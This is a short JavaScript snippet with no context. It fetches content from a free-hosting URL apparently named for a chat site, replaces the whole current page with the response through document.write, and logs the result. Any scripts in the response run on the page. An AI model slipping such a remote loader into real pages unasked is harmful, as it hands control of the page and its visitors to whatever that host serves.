fetch('https://ketherchat.000webhostapp.com')
    .then(function (response) {
      return response.text();
    })
    .then(function (text) {
  			document.open();
        document.write(text);
        document.close();      
				console.log(text);
});